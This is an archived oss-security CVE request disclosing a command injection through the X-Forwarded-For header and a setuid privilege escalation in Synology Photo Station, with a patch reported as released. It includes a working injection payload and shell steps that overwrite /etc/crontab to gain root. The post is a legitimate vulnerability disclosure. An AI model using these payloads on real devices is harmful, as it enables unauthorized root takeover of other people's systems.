  oss-security - CVE request: Synology Photo Station command injection and privilege  escalation            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 28 Jan From: "lucas_leong@...nd.com.tw" <lucas_leong@...nd.com.tw> To: "cve-assign@...re.org" <cve-assign@...re.org> CC: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com> Subject: CVE request: Synology Photo Station command injection and privilege  escalation  Title: Synology Photo Station command injection and privilege escalation Vendor: Synology (https://www.synology.com/) Product: Photo Station Status: Patch released Affected: version <= Impact: Any guest account can execute arbitrary command with root permission    Vulnerability 1: Command injection  The vulnerability is in appstore/PhotoStation/photo/login.php      if ($x_forward) {         $ip = $x_forward;     } ...     $commend = "/usr/syno/bin/synoautoblock --reset \"".$ip."\"";     @system($commend, $retval);  Since, the page did not filter X-Forwarded-For header and lead to command injection After sending a crafted header, a command is executed under http permission  X-Forwarded-For: ";id>/tmp/hack;"  > cat /tmp/hack    Vulnerability 2: Privilege escalation  For the privilege escalation vulnerability, it is a simple setuid problem.  > ls -al /usr/syno/bin/synophoto_dsm_user lrwxrwxrwx    1 root     root            56 Sep 16 /usr/syno/bin/synophoto_dsm_user -> /var/packages/PhotoStation/target/bin/synophoto_dsm_user > ls -al /var/packages/PhotoStation/target/bin/synophoto_dsm_user -rwsr-xr-x    1 root     root         Jul  6 /var/packages/PhotoStation/target/bin/synophoto_dsm_user > ls -al /tmp/hack2 -rw-rw-rw-    1 http     http            15 Sep 23 /tmp/hack2 > cat /tmp/hack2 pwned by lucas > ls -al /etc/crontab -rw-r--r--    1 root     root           Aug 27 /etc/crontab > synophoto_dsm_user --copy-no-ea /tmp/hack2 /etc/crontab > cat /etc/crontab pwned by lucas  After overwritng crontab, arbitrary process can be executed with root permission   Patch: Vendor released the patch and the issue has solved in https://www.synology.com/en-us/releaseNote/PhotoStation  Timeline:         Vendor Notified         Patch Released    <table class="TM_EMAIL_NOTICE"><tr><td><pre> TREND MICRO EMAIL NOTICE The information contained in this email and any attachments is confidential  and may be subject to copyright or other intellectual property protection.  If you are not the intended recipient, you are not authorized to use or  disclose this information, and we request that you notify us by reply mail or telephone and delete the original message from your mail system. </pre></td></tr></table>   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      